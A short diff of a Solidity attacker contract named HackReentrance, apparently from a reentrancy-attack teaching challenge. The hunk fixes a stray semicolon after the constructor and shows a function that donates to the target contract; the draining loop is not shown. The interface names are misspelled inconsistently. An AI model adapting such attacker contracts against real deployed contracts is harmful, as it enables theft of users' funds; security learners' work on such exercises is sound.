@@ -12,7 +12,7 @@ contract HackReentrance {
 
   constructor(IReentance _reentranceAddress) public payable {
     reentranceAddress = IReetrance(_reentranceAddress);
-  };
+  }
 
   function becomeDonor() public {
     reentranceAddress.donate.value(msg.value)(address(this));
